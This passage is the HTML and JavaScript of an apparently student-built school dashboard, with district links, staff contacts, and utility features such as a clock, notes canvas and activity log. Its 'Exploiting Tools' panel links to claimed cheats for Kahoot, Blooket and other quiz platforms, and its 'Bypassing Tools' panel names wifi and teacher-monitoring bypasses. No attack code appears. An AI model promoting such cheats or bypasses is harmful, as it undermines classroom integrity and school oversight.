        <h2>📘 Student Handbooks</h2>
        <div class="handbook-buttons">
          <a href="https://cdnsm5-ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Elementary%20Handbook.pdf" target="_blank">Elementary Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Secondary%20Student%20Handbook.pdf" target="_blank">Secondary Student Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/District%20Handbook%20copy.pdf" target="_blank">District Handbook</a>
          <a href="https://middletown.ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025B%20RA%20Academy%20Handbook%20copy.pdf" target="_blank">RA Academy Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/2024-2025%20Virtual%20Learning%20Plan%20RSVD%20DEC2024.pdf" target="_blank">Virtual Learning Plan (2024-2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/2024-2025%20Dress%20Code.docx.pdf" target="_blank">Dress Code (2024-2025)</a>
        </div>
      </div>

      <!-- Map Panel -->
      <div id="mapPanel" class="info-panel"><h2>🏫 Building Map</h2><div class="coming-soon">Building Map Coming Soon</div></div>
      <!-- Student Websites Panel -->
      <div id="studentWebsitesPanel" class="info-panel">
        <h2>🌐 Student Websites</h2>
        <div class="links-list">
          <a href="https://www.raiderweb.org" target="_blank">RaiderWeb</a><a href="https://middletownsd.instructure.com/login" target="_blank">Canvas Login</a>
          <a href="https://caresolace.com/site/middletownarea" target="_blank">Care Solace</a><a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank">Clever Login</a>
          <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank">EasyBridge</a><a href="https://myhealthyzone.fitnessgram.net" target="_blank">FitnessGram</a>
          <a href="https://www.raiderweb.org/student_services/hazing_reporting" target="_blank">Hazing Reporting</a><a href="https://www.youtube.com/user/MAHSAnnouncements?app=desktop" target="_blank">MAHS Announcements</a>
          <a href="https://id.naviance.com" target="_blank">Naviance</a><a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank">Destiny Library</a>
          <a href="https://powerschool.raiderweb.org/public/" target="_blank">PowerSchool</a><a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank">Scholastic</a>
          <a href="https://www.safe2saypa.org" target="_blank">Safe2Say</a><a href="https://mail.google.com/mail/" target="_blank">Gmail</a>
          <a href="https://www.balfour.com/pennsylvania/middletown/middletown-area-high-school" target="_blank">Balfour</a><a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">LinkIt!</a>
        </div>
      </div>
      <!-- Teacher Websites Panel -->
      <div id="teacherWebsitesPanel" class="info-panel">
        <h2>👩‍🏫 Teacher Websites</h2>
        <div class="links-list">
          <a href="https://alo.acadiencelearning.org/login" target="_blank">Acadience Learning</a><a href="https://app.aimswebplus.com/#/login" target="_blank">AIMSweb Plus</a>
          <a href="https://ep1.erplinq.com/MIDDLETOWN/" target="_blank">ERP Linq</a><a href="https://sso.barracuda.com/u/login/identifier?state=hKFo2SBFYnNBRjVRYmczc2t0ZjlSNmwxel9GT25LZ2o3QzVDV6Fur3VuaXZlcnNhbC1sb2dpbqN0aWTZIDQ1U0hHOGVubzF0eE10WlhiSkRZRnNQSmJqY1dwcnFlo2NpZNkgQk1yY2JuRWdkS3BkSjZRWGVjN0hiRHdlTkpMUW1MSUk" target="_blank">Barracuda</a>
          <a href="https://shop.buyguernsey.com/thmBootstrapHome.aspx" target="_blank">Buy Guernsey</a><a href="https://middletownsd.instructure.com/login/ldap" target="_blank">Canvas (Teacher)</a>
          <a href="https://caresolace.com/site/middletownarea" target="_blank">Care Solace</a><a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank">Clever (Teacher)</a>
          <a href="https://www.discoveryeducation.com" target="_blank">Discovery Education</a><a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank">EasyBridge (Teacher)</a>
          <a href="https://raiderweb.gofmx.com/login" target="_blank">FMX</a><a href="https://myhealthyzone.fitnessgram.net" target="_blank">FitnessGram</a>
          <a href="https://login.frontlineeducation.com/login?signin=d0e98b785fd46dad06ce5509e61ef781&productId=ABSMGMT&clientId=ABSMGMT#/login" target="_blank">Frontline</a><a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">LinkIt! (Teacher)</a>
          <a href="https://id.naviance.com" target="_blank">Naviance</a><a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank">Destiny Library</a>
          <a href="https://paetep.edulinksolutions.com/login" target="_blank">PA eTEP</a><a href="https://powerschool.raiderweb.org/teachers/pw.html" target="_blank">PowerSchool (Teacher)</a>
          <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank">Scholastic</a><a href="https://go.schoolmessenger.com/#/home" target="_blank">SchoolMessenger</a>
          <a href="https://www.pdesas.org/standard/" target="_blank">PDE SAS</a><a href="https://www.pbisapps.org" target="_blank">PBIS Apps</a>
          <a href="https://masd.happyfox.com/home/" target="_blank">HappyFox</a><a href="https://middletownasd-pa.safeschools.com/login" target="_blank">SafeSchools</a>
          <a href="https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=1&msaredir=1&client-request-id=2318564a-0ba1-6e05-dc95-01e3d532fa2a&protectedtoken=true&claims=%7b%22id_token%22%3a%7b%22xms_cc%22%3a%7b%22values%22%3a%5b%22CP1%22%5d%7d%7d%7d&nonce=637946967978129696.e952fd14-38f0-4c99-9385-0e633dcd181b&state=DYu5EYAwDMAcOMYxiePgZxzI01KyPi6kU6MEAHuwBamEQIXVm7ioq1H1qHP6VdeghmyrYOvu6GwXlinMow8yelK8R36_O_8" target="_blank">Office 365</a>
        </div>
      </div>

      <!-- Phone Directory Panel -->
      <div id="phoneDirectoryPanel" class="info-panel"><h2>📞 Phone Directory</h2><div class="coming-soon">Update Coming Soon!</div></div>
      <!-- Camera Panel -->
      <div id="cameraPanel" class="info-panel"><h2>📷 Camera Info</h2><div class="coming-soon">Update Coming Soon</div></div>
      <!-- School Info Panel -->
      <div id="schoolInfoPanel" class="info-panel">
        <h2>🏫 School Information</h2>
        <div class="school-info-grid">
          <div><span class="school-info-label">School Name:</span> Middletown Area Middle School</div>
          <div><span class="school-info-label">Address:</span> 215 Oberlin Road Middletown, PA 17057</div>
          <div><span class="school-info-label">Phone:</span> 717-930-0739</div><div><span class="school-info-label">Fax:</span> 717-944-0591</div>
          <div><span class="school-info-label">Principal:</span> Dr. Shannon L. Wevodau</div><div><span class="school-info-label">Principal Phone:</span> 717-930-0739</div>
          <div><span class="school-info-label">Principal Email:</span> swevodau@raiderweb.org</div><div><span class="school-info-label">Assistant Principal:</span> Mr. Michael DeFilippo</div>
          <div><span class="school-info-label">AP Phone:</span> 717-930-0739</div><div><span class="school-info-label">AP Email:</span> mdefilippo@raiderweb.org</div>
        </div>
      </div>

      <!-- Exploits Panel -->
      <div id="exploitPanel" class="info-panel">
        <h2>🧨 Exploiting Tools</h2>
        <div class="exploit-buttons">
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Blooket Exploit</a><a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Kahoot Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Gimkit Exploit</a><a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quizlet Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quizzes Exploit</a><a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quills Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Edpuzzle Exploit</a><a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Nearpod Exploit</a>
        </div>
      </div>

      <!-- Bypass Panel -->
      <div id="bypassPanel" class="info-panel">
        <h2>🚪 Bypassing Tools</h2>
        <div class="bypass-buttons">
          <button onclick="dashboard.showBypassContent('bathroom')">Bathroom Bypass</button>
          <button onclick="dashboard.showBypassContent('wifi')">Wifi Bypass</button>
          <button onclick="dashboard.showBypassContent('monitoring')">Teacher Monitoring Bypass</button>
          <button onclick="dashboard.showBypassContent('coming1')">Coming Soon</button>
          <button onclick="dashboard.showBypassContent('coming2')">Coming Soon</button>
          <button onclick="dashboard.showBypassContent('coming3')">Coming Soon</button>
        </div>
        <div id="bathroomBypass" class="bypass-content"><p>COMING SOON</p></div>
        <div id="wifiBypass" class="bypass-content"><p>Go to School Wifi Information</p></div>
        <div id="monitoringBypass" class="bypass-content"><p>COMING SOON</p></div>
        <div id="coming1Bypass" class="bypass-content"><p>COMING SOON</p></div>
        <div id="coming2Bypass" class="bypass-content"><p>COMING SOON</p></div>
        <div id="coming3Bypass" class="bypass-content"><p>COMING SOON</p></div>
      </div>

      <!-- VPN Panel -->
      <div id="vpnPanel" class="info-panel">
        <h2>🔐 VPN Websites</h2>
        <div class="links-list">
          <a href="https://example-vpn1.com" target="_blank">VPN Service 1</a><a href="https://example-vpn2.com" target="_blank">VPN Service 2</a>
          <a href="https://example-vpn3.com" target="_blank">VPN Service 3</a><a href="https://example-vpn4.com" target="_blank">VPN Service 4</a>
        </div>
      </div>
      <!-- Gaming Panel -->
      <div id="gamingPanel" class="info-panel"><h2>🎮 Gaming Websites</h2><div class="coming-soon">COMING SOON</div></div>
      <!-- Music Panel -->
      <div id="musicPanel" class="info-panel"><h2>🎵 Music Websites</h2><div class="coming-soon">COMING SOON</div></div>
      <!-- Keyboard Tricks Panel -->
      <div id="keyboardPanel" class="info-panel">
        <h2>🎹 Keyboard Tricks</h2>
        <div class="info-text">
          <p>
            <strong>System Shortcuts:</strong><br>
            Spotlight: ⌘ + Space | Home Screen: ⌘ + H | Show Dock: ⌘ + Option + D<br>
            App Library: Shift + Globe + A | Quick Note: Globe + Q | Siri: Globe + S | Control Center: Globe + C<br>
            Notification Center: Globe + N | Show All Windows: Globe + Down Arrow | App Switcher: Globe + Up Arrow<br>
            <strong>Multitasking:</strong><br>
            Switch App: ⌘ + Tab | Split View: Control + Globe + Arrow | Slide Over: Globe + Backslash<br>
            <strong>Safari Shortcuts:</strong><br>
            New Tab: ⌘ + T | Close Tab: ⌘ + W | Reopen Closed Tab: Shift + ⌘ + T | Private Tab: ⌘ + Shift + N<br>
            Navigate tabs: ⌘ + 1-8 | Go to last tab: ⌘ + 9 | Tab Grid: Shift + ⌘ + .<br>
            <strong>General Navigation & Editing:</strong><br>
            Tab: Tab key | Select All: ⌘ + A | Copy: ⌘ + C | Cut: ⌘ + X | Paste: ⌘ + V | Undo: ⌘ + Z | Redo: ⌘ + Shift + Z<br>
            Top of Page: ⌘ + Up Arrow | Bottom of Page: ⌘ + Down Arrow<br>
            Press & hold Command (⌘) for app-specific shortcuts. Globe key for system-wide list.
          </p>
        </div>
      </div>
    </div>

    <!-- New Utility Panels -->
    <!-- Settings Panel -->
    <div id="settingsPanel" class="info-panel">
      <h2>⚙️ Settings</h2>
      <p>Customize your dashboard experience:</p>
      <div style="display: flex; flex-wrap: wrap; gap: 10px; justify-content: center;">
          <button class="setting-option" onclick="alert('Theme customization is applied via the Light/Dark mode toggle in the quick bar. More advanced theme options planned.')">Theme Customization</button>
          <button class="setting-option" onclick="alert('Profile management feature is a placeholder. No user profiles implemented.')">Profile Management</button>
          <button class="setting-option" onclick="alert('Display settings adjustment is a placeholder.')">Display Settings</button>
          <button class="setting-option" onclick="alert('Sound preferences are not implemented (alerts are used instead).')">Sound Preferences</button>
          <button class="setting-option" onclick="alert('Privacy settings functionality is a placeholder.')">Privacy Settings</button>
          <button class="setting-option" onclick="alert('Account security options are not implemented.')">Account Security</button>
          <button class="setting-option" onclick="alert('Notification preference settings are not implemented.')">Notification Preferences</button>
          <button class="setting-option" onclick="alert('Cache management functionality is a placeholder.')">Cache Management</button>
          <button class="setting-option" onclick="alert('Font scaling is currently handled by browser zoom, not an in-app setting.')">Font Scaling</button>
          <button class="setting-option" onclick="alert('Language options are not implemented, using system default.')">Language Options</button>
          <button class="setting-option" onclick="alert('Backup settings functionality is a placeholder.')">Backup Settings</button>
          <button class="setting-option" onclick="alert('Integration settings are not implemented.')">Integrations</button>
          <button class="setting-option" onclick="alert('Advanced options are placeholders for future development.')">Advanced Options</button>
          <button class="setting-option" onclick="alert('System information is limited to version displayed.')">About System</button>
          <button class="setting-option" onclick="alert('Resetting to defaults is a placeholder action.')">Reset Defaults</button>
      </div>
    </div>

    <!-- Random Facts Panel -->
    <div id="factsPanel" class="info-panel">
      <h2>💡 Random Facts</h2>
      <p id="randomFact">Loading fact...</p>
    </div>

    <!-- Daily Quotes Panel -->
    <div id="quotesPanel" class="info-panel">
      <h2>💬 Daily Quotes</h2>
      <p id="dailyQuote">Loading quote...</p>
    </div>

    <!-- Notes Canvas Container -->
    <div id="canvasContainer">
      <h2>🖌️ Notes Canvas</h2>
      <canvas id="notesCanvas" width="600" height="400"></canvas>
      <div id="canvasControls">
        <button id="changeCanvasColorBtn" title="Choose Brush Color">🎨 Color</button>
        <input type="range" id="canvasStrokeWidth" min="1" max="15" value="2" title="Stroke Thickness">
        <button id="changeCanvasMaterialBtn" title="Change Brush Style">🔧 Brush</button> <!-- Placeholder -->
        <textarea id="canvasText" placeholder="Type text here..." rows="2" cols="30"></textarea>
        <button id="addCanvasTextBtn" title="Add text to canvas">Add Text</button>
        
        <button id="clearCanvasBtn" title="Clear the entire canvas">Clear Canvas</button>
        <button id="closeCanvasBtn" title="Close the notes editor">Close Notes</button>
      </div>
    </div>
    
    <!-- Activity Log Display Panel -->
    <div id="activityLogDisplay" class="info-panel">
        <h2>📜 System Activity Log</h2>
        <ul id="activityLogList" style="list-style: none; padding: 0;"></ul>
        <button class="close-panel-btn" onclick="dashboard.togglePanel('activityLogDisplay')">Close</button> <!-- Dynamic close button -->
    </div>

    <!-- Login History Display Panel -->
    <div id="loginHistoryDisplay" class="info-panel">
        <h2>👤 Login History</h2>
        <p><strong>Last Login:</strong> <span id="lastLoginInfo">Loading...</span></p>
        <button class="close-panel-btn" onclick="dashboard.togglePanel('loginHistoryDisplay')">Close</button> <!-- Dynamic close button -->
    </div>

  </div> <!-- End of #dashboard -->

  <script>
    // Global array to store all user actions for logging purposes
    window.activityLogs = []; 

    // Function to log user actions with timestamp and details
    function logAction(actionDescription, details = {}) {
        const now = new Date();
        const logEntry = {
            timestamp: now.toISOString(), // ISO format for consistency
            action: actionDescription,
            details: details
        };
        window.activityLogs.push(logEntry);
        // console.log(`Logged: ${actionDescription}`, details); // Debug logging
    }

    const dashboard = {
      // Initialize all dashboard features
      init: function() {
        this.initSessionTimer(); this.initClock(); this.generateCalendar(); this.initThemeToggle();
        this.initButtons(); this.initCanvas(); this.initPanels(); this.initQuickBar();
        this.initSearch(); this.initLogDownloadButton(); this.initMakePanelsDraggableAndResizable();
        this.initTools(); this.initThemeDisplay(); this.fetchRandomFact(); this.fetchDailyQuote();
        this.initActivityLogBtn(); this.initLoginHistoryBtn(); this.applyWifiLevelColors();
        this.initKeybinds(); // Added initialization for keybinds
        this.initCalculatorButton(); // Added for Calculator
        this.initUnitConverterButton(); // Added for Unit Converter
        this.initStatsButton(); // Added for Stats
        this.initMediaButton(); // Added for Media
        this.initReminderButton(); // Already present in initTools, but good to ensure it's called if split.
      },
      
      // Session Timer Initialization
      initSessionTimer: function() {
        let sessionSeconds = 0;
        function formatTime(seconds) {
          const hrs = String(Math.floor(seconds / 3600)).padStart(2, '0');
          const mins = String(Math.floor((seconds % 3600) / 60)).padStart(2, '0');
          const secs = String(seconds % 60).padStart(2, '0');
          return `${hrs}:${mins}:${secs}`;
        }
        const sessionTimeElement = document.getElementById('sessionTime');
        if (sessionTimeElement) {
          sessionTimeElement.innerText = `⏳ Session Time: ${formatTime(sessionSeconds)}`;
          setInterval(() => {
            sessionSeconds++;
            sessionTimeElement.innerText = `⏳ Session Time: ${formatTime(sessionSeconds)}`;
          }, 1000);
        }
      },
      
      // Real-time Clock and Date Initialization
      initClock: function() {
        const realTimeClock = document.getElementById('realTimeClock');
        const realDate = document.getElementById('realDate');
        if (realTimeClock && realDate) {
          function updateClock() {
            const now = new Date();
            // Check global is24HourFormat from login script
            const is24hr = typeof is24HourFormat !== 'undefined' ? is24HourFormat : false;
            const optionsTime = { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: !is24hr };
            const optionsDate = { weekday: 'short', month: 'short', day: 'numeric', year: 'numeric' };
            const timeStr = now.toLocaleTimeString(undefined, optionsTime);
            const dateStr = now.toLocaleDateString(undefined, optionsDate);

            realTimeClock.innerText = '🕒 ' + timeStr;
            realDate.innerText = '📅 ' + dateStr;
          }
          updateClock();
          setInterval(updateClock, 1000);
        }
      },
      
      // Calendar Generation
      generateCalendar: function() {
        const calendar = document.getElementById('calendar');
        if (calendar) {
          calendar.innerHTML = ''; // Clear previous content
          const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
          days.forEach(day => calendar.appendChild(document.createRange().createContextualFragment(`<div>${day}</div>`)));

          const date = new Date();
          const year = date.getFullYear(), month = date.getMonth(), today = date.getDate();
          const firstDay = new Date(year, month, 1).getDay();
          const lastDate = new Date(year, month + 1, 0).getDate();

          for (let i = 0; i < firstDay; i++) calendar.appendChild(document.createRange().createContextualFragment(`<div></div>`));
          for (let i = 1; i <= lastDate; i++) {
            const cell = document.createRange().createContextualFragment(`<div>${i}</div>`);
            if (i === today) cell.querySelector('div').classList.add('today');
            calendar.appendChild(cell);
          }
        }
      },
      
      // Theme Toggle Button Initialization
      initThemeToggle: function() {
        const themeBtn = document.getElementById('themeToggle');
        if (themeBtn) {
          themeBtn.addEventListener('click', () => {
            logAction("Theme Toggled");
            document.body.classList.toggle('light-theme');
            themeBtn.innerText = document.body.classList.contains('light-theme') ? '☀️ Light Mode' : '🌙 Dark Mode';
          });
        }
      },
      
      // Initialization of general dashboard buttons (panic, restart, etc.)
      initButtons: function() {
        document.getElementById('panicBtn')?.addEventListener('click', () => { logAction("Panic Button Clicked"); window.open('https://clever.com', '_blank'); });
        document.getElementById('restartBtn')?.addEventListener('click', () => {
          logAction("Restart Button Clicked");
          if(confirm('Are you sure you want to restart the dashboard? This will refresh the page.')) window.location.reload();
        });
        document.getElementById('fixIssuesBtn')?.addEventListener('click', () => {
          logAction("Fix Issues Button Clicked");
          alert('Running diagnostics...\nNo issues found. Your dashboard is running smoothly!');
        });
        document.getElementById('fullScreenBtn')?.addEventListener('click', () => {
          logAction("Fullscreen Button Toggled");
          const docEl = document.documentElement;
          const requestFullscreen = docEl.requestFullscreen || docEl.webkitRequestFullscreen || docEl.msRequestFullscreen;
          const exitFullscreen = document.exitFullscreen || document.webkitExitFullscreen || document.msExitFullscreen;
          if (!document.fullscreenElement) requestFullscreen?.call(docEl); else exitFullscreen?.call(document);
        });

        // Zoom functionality
        let zoomLevel = 1.0;
        const zoomStep = 0.1, minZoom = 0.5, maxZoom = 2.0;
        const zoomInBtn = document.getElementById('zoomInBtn');
        const zoomOutBtn = document.getElementById('zoomOutBtn');

        const updateZoom = (direction) => {
          let currentZoom = parseFloat(document.body.style.zoom || '1');
          let newZoom = currentZoom + (direction === 'in' ? zoomStep : -zoomStep);
          newZoom = Math.max(minZoom, Math.min(maxZoom, newZoom)); // Clamp zoom
          document.body.style.zoom = newZoom;
          logAction(`Zoom ${direction} Button Clicked`, { level: newZoom });
        };

        zoomInBtn?.addEventListener('click', () => updateZoom('in'));
        zoomOutBtn?.addEventListener('click', () => updateZoom('out'));
      },
      
      // Canvas for Notes: initialization and event handling
      initCanvas: function() {
        const notesBtn = document.getElementById('notesBtn');
        const canvasContainer = document.getElementById('canvasContainer');
        const mainGrid = document.getElementById('mainGrid');

        if (!notesBtn || !canvasContainer || !mainGrid) return; // Exit if elements aren't found

        // Toggle between main view and canvas
        notesBtn.addEventListener('click', () => { logAction("Notes Button Clicked"); mainGrid.style.display = 'none'; canvasContainer.style.display = 'block'; });
        document.getElementById('closeCanvasBtn')?.addEventListener('click', () => {
          logAction("Close Notes Button Clicked");
          canvasContainer.style.display = 'none';
          mainGrid.style.display = 'flex';
        });

        const canvas = document.getElementById('notesCanvas');
        const ctx = canvas.getContext('2d');
        ctx.fillStyle = '#fff'; ctx.fillRect(0, 0, canvas.width, canvas.height); // White canvas background
        let drawing = false, currentLineColor = '#ff914d', currentLineWidth = 2;

        // Helper to get mouse/touch coordinates relative to canvas
        function getPos(evt) {
          const rect = canvas.getBoundingClientRect();
          const clientX = evt.clientX || evt.touches[0].clientX;
          const clientY = evt.clientY || evt.touches[0].clientY;
          return { x: clientX - rect.left, y: clientY - rect.top };
        }

        // Drawing event handlers
        const startDrawing = (evt) => { drawing = true; const pos = getPos(evt); ctx.beginPath(); ctx.moveTo(pos.x, pos.y); ctx.strokeStyle = currentLineColor; ctx.lineWidth = currentLineWidth; ctx.lineCap = 'round'; ctx.lineJoin = 'round'; evt.preventDefault(); };
        const draw = (evt) => { if (!drawing) return; const pos = getPos(evt); ctx.lineTo(pos.x, pos.y); ctx.stroke(); evt.preventDefault(); };
        const stopDrawing = (evt) => { if (drawing) { drawing = false; logAction("Finished drawing stroke", { color: currentLineColor, width: currentLineWidth }); } evt.preventDefault(); };

        canvas.addEventListener('mousedown', startDrawing); canvas.addEventListener('touchstart', startDrawing);
        canvas.addEventListener('mousemove', draw); canvas.addEventListener('touchmove', draw);
        ['mouseup', 'mouseleave', 'touchend', 'touchcancel'].forEach(evtName => canvas.addEventListener(evtName, stopDrawing));

        // Canvas Control listeners
        document.getElementById('clearCanvasBtn')?.addEventListener('click', () => {
          logAction("Clear Canvas Button Clicked");
          ctx.clearRect(0, 0, canvas.width, canvas.height); ctx.fillStyle = '#fff'; ctx.fillRect(0, 0, canvas.width, canvas.height);
        });

        // Color Picker setup
        const changeCanvasColorBtn = document.getElementById('changeCanvasColorBtn');
        const colorInput = document.createElement('input');
        colorInput.type = 'color'; colorInput.style.display = 'none'; colorInput.value = currentLineColor; document.body.appendChild(colorInput);
        changeCanvasColorBtn?.addEventListener('click', () => colorInput.click());
        colorInput.addEventListener('input', (e) => {
          currentLineColor = e.target.value; ctx.strokeStyle = currentLineColor;
          logAction("Canvas Color Changed", { color: currentLineColor });
        });

        // Stroke Thickness Slider
        const canvasStrokeWidthInput = document.getElementById('canvasStrokeWidth');
        canvasStrokeWidthInput?.addEventListener('input', (e) => {
          currentLineWidth = parseInt(e.target.value, 10); ctx.lineWidth = currentLineWidth;
          logAction("Canvas Stroke Width Changed", { width: currentLineWidth });
        });

        // Brush Style Placeholder
        document.getElementById('changeCanvasMaterialBtn')?.addEventListener('click', () => {
          logAction("Brush Style Button Clicked", { action: "Placeholder" });
          alert("Brush style customization is a placeholder feature. Functionality not implemented.");
        });

        // Add Text to Canvas
        const addCanvasTextBtn = document.getElementById('addCanvasTextBtn');
        const canvasTextarea = document.getElementById('canvasText');
        addCanvasTextBtn?.addEventListener('click', () => {
          const textToAdd = canvasTextarea.value.trim();
          if (textToAdd) {
            logAction("Adding Text to Canvas", { text: textToAdd, color: currentLineColor, fontSize: `${currentLineWidth * 10}px` });
            ctx.fillStyle = currentLineColor; ctx.font = `${currentLineWidth * 10}px 'Montserrat', sans-serif`;
            ctx.fillText(textToAdd, 20, 50);
            canvasTextarea.value = '';
          }
        });

        // Screenshot functionality
        document.getElementById('screenshotBtn')?.addEventListener('click', () => {
          logAction("Screenshot Button Clicked");
          html2canvas(document.body).then(canvasImg => {
            const link = document.createElement('a');
            link.download = `dashboard_screenshot_${new Date().toISOString().replace(/[-T:]/g, '')}.png`;
            link.href = canvasImg.toDataURL('image/png');
            document.body.appendChild(link); link.click(); document.body.removeChild(link);
          }).catch(error => { console.error("Screenshot failed:", error); alert("Failed to capture screenshot."); });
        });
        
        // Export Notes Canvas
        document.getElementById('exportNotesBtn')?.addEventListener('click', () => {
          logAction("Export Notes Button Clicked");
          const link = document.createElement('a');
          link.download = `notes_canvas_${new Date().toISOString().replace(/[-T:]/g, '')}.png`;
          link.href = canvas.toDataURL('image/png');
          document.body.appendChild(link); link.click(); document.body.removeChild(link);
        });

        // Toggle main content sections visibility
        document.getElementById('toggleSectionsBtn')?.addEventListener('click', () => {
          logAction("Toggle Sections Button Clicked");
          const isContentHidden = mainGrid.style.display === 'none';
          mainGrid.style.display = isContentHidden ? 'flex' : 'none';
          document.getElementById('toggleSectionsBtn').innerText = isContentHidden ? '⬆️ Hide Sections' : '⬇️ Show Sections';
        });
      },
      
      // Initialize panel visibility states
      initPanels: function() {
        document.querySelectorAll('.info-panel, .ipad-content, .bypass-content').forEach(el => el.style.display = 'none');
      },
      
      // Quick Bar functionality is initialized via specific button handlers.
      initQuickBar: function() {},
      
      // Search bar in dashboard quick bar
      initSearch: function() {
        const searchInput = document.getElementById('dashboardSearch');
        if (searchInput) {
          searchInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
              e.preventDefault();
              const query = searchInput.value.trim().toLowerCase();
              if (!query) return;
              logAction("Dashboard Search Submitted", { query: query });
              
              let found = false;
              // Prioritize specific panel searches, then general keywords
              const searchTargets = {
                'calendar': 'calendar', 'notes': ['notesBtn', 'canvasContainer'], 'updates': '#updatesNotifications .box:has(h2:contains("Updates"))', 'wifi': 'wifiPanel',
                'settings': 'settingsPanel', 'timer': 'timerBtn', 'stopwatch': 'stopwatchBtn', 'activity log': 'activityLogBtn', 'login history': 'loginHistoryBtn',
                'facts': 'factsPanel', 'quotes': 'quotesPanel', 'calculator': 'calculatorBtn', 'converter': 'unitConverterBtn', 'stats': 'statsBtn', 'media': 'mediaBtn', 'reminder': 'reminderBtn'
              };

              // Check direct panel/button IDs first
              for (const [key, targetId] of Object.entries(searchTargets)) {
                if (query.includes(key)) {
                  if (typeof targetId === 'string' && targetId.includes('Panel')) {
                      if (document.getElementById(targetId).style.display === 'none') {
                          dashboard.togglePanel(targetId); // Toggle if hidden
                      }
                      document.getElementById(targetId).scrollIntoView({ behavior: 'smooth', block: 'center' });
                  } else if (typeof targetId === 'string' && (targetId.endsWith('Btn') || targetId.includes('Container'))) { // For buttons that toggle panels or actions
                      document.getElementById(targetId)?.click();
                      found = true; // Clicking often implies showing a panel, which scrolls.
                      if (targetId === 'activityLogBtn') document.getElementById('activityLogDisplay').scrollIntoView({ behavior: 'smooth', block: 'center' });
                      if (targetId === 'loginHistoryBtn') document.getElementById('loginHistoryDisplay').scrollIntoView({ behavior: 'smooth', block: 'center' });
                  }
                  if (found) break; // Exit loop if an action/toggle was performed
                  // If it's a direct element ID without specific toggle logic, just scroll to it
                  const elem = document.getElementById(targetId);
                  if (elem) {
                      elem.scrollIntoView({ behavior: 'smooth', block: 'center' });
                      found = true;
                      break;
                  }
                }
              }
              // If still not found, perform a broader search in panel titles
              if (!found) {
                const panels = document.querySelectorAll('.info-panel, .box[data-panel-id], #canvasContainer');
                for (const panel of panels) {
                    if (panel.textContent.toLowerCase().includes(query) || 
                        (panel.dataset.panelId && panel.dataset.panelId.includes(query)) || 
                        (panel.id && panel.id.toLowerCase().includes(query.replace(' ', '')))
                    ) {
                        if (panel.classList.contains('info-panel') && panel.style.display === 'none') {
                            dashboard.togglePanel(panel.id);
                        }
                        panel.scrollIntoView({ behavior: 'smooth', block: 'center' });
                        found = true;
                        break;
                    }
                }
              }

              if (!found) alert(`Section or feature "${searchInput.value}" not found.`);
            }
          });
        }
      },
      
      // Download Activity Logs Button
      initLogDownloadButton: function() {
        document.getElementById('downloadActivityLogsBtn')?.addEventListener('click', () => {
          logAction("Download Activity Logs Button Clicked");
          if (window.activityLogs && window.activityLogs.length > 0) {
            const logString = JSON.stringify(window.activityLogs, null, 2);
            const blob = new Blob([logString], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `activity_logs_${new Date().toISOString().replace(/[-T:]/g, '')}.json`;
            document.body.appendChild(a); a.click(); URL.revokeObjectURL(url); document.body.removeChild(a);
          } else alert('No activity logs to download.');
        });
      },
      
      // Make Panels Draggable and Resizable using interact.js
      initMakePanelsDraggableAndResizable: function() {
          interact('.box')
              .draggable({ inertia: true, autoScroll: true, 
                onmove: function (event) {
                  const target = event.target;
                  const x = (parseFloat(target.getAttribute('data-x')) || 0) + event.dx;
                  const y = (parseFloat(target.getAttribute('data-y')) || 0) + event.dy;
                  target.style.transform = `translate(${x}px, ${y}px)`;
                  target.setAttribute('data-x', x); target.setAttribute('data-y', y);
                },
